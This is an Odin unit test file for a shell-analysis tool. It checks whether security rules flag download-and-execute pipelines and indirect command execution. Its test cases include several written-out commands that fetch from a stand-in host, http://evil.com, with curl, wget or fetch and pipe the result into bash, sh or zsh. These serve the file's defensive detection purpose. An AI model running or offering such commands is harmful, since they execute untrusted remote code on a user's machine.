package shellx

import "core:fmt"
import "core:strings"
import "core:testing"

@(test)
test_security_rule_issues :: proc(t: ^testing.T) {
	if !should_run_test("test_security_rule_issues") { return }
	
	fmt.println("\n=== Testing Security Rule Issues ===")
	
	// Test 1: sec.ast.pipe_download_exec (Rule 9)
	fmt.println("\n1. Testing sec.ast.pipe_download_exec (AST vs text-based):")
	
	test_cases := []struct {
		code: string,
		should_trigger: bool,
		description: string,
	}{
		{"curl http://evil.com | bash", true, "Basic curl | bash"},
		{"wget -O - http://evil.com | sh", true, "Basic wget | sh"},
		{"fetch http://evil.com | zsh", true, "Basic fetch | zsh"},
		{"/usr/bin/curl http://evil.com | bash", true, "Full path curl | bash"},
		{"\\curl http://evil.com | zsh", true, "Escaped curl | zsh"},
		{"curl -s http://evil.com | tee file | bash", true, "Complex pipeline"},
		{"echo hello | bash", false, "No download command"},
		{"curl http://evil.com > file", false, "No pipe to shell"},
	}
	
	for tc, i in test_cases {
		fmt.printf("  Test %d: %s\n", i+1, tc.description)
		result := translate(tc.code, .Bash, .Bash)
		defer destroy_translation_result(&result)
		
		found_text := false
		found_ast := false
		for finding in result.findings {
			if finding.rule_id == "sec.pipe_download_exec" {
				found_text = true
			}
			if finding.rule_id == "sec.ast.pipe_download_exec" {
				found_ast = true
			}
		}
		
		if tc.should_trigger {
			if !found_ast && found_text {
				fmt.println("    ISSUE: AST rule not triggered but text rule was!")
				testing.expect(t, false, "AST rule should trigger when text rule does")
			} else if found_ast {
				fmt.println("    OK: Both rules triggered")
			} else {
				fmt.println("    OK: No rules triggered (expected for some cases)")
			}
		}
	}
	
	// Test 2: sec.ast.indirect_exec (Rule 13)
	fmt.println("\n2. Testing sec.ast.indirect_exec:")
	
	indirect_cases := []struct {
		code: string,
		description: string,
	}{
		{"$ls", "Variable expansion $ls"},
		{"$cmd", "Variable expansion $cmd"},
		{"${cmd}", "Variable expansion ${cmd}"},
		{"cmd=\"echo\"; $cmd hello", "Indirect via variable"},
		{"$(ls)", "Command substitution $(ls)"},
		{"$(echo ls)", "Nested command substitution"},
		{"${!var}", "Indirect reference in bash"},
		{"\"${array[0]}\"", "Array element as command"},
		{"echo $ls", "Variable as argument (not command)"},
		{"eval '$ls'", "Eval with variable"},
	}
	
	for tc, i in indirect_cases {
		fmt.printf("  Test %d: %s\n", i+1, tc.description)
		result := translate(tc.code, .Bash, .Bash)
		defer destroy_translation_result(&result)
		
		found := false
		for finding in result.findings {
			if finding.rule_id == "sec.ast.indirect_exec" {
				found = true
				fmt.printf("    Found: %s - %s\n", finding.rule_id, finding.message)
				break
			}
		}
		
		if !found {
			fmt.println("    Not triggered")
		}
	}
	
	fmt.println("\n=== Test Complete ===")
}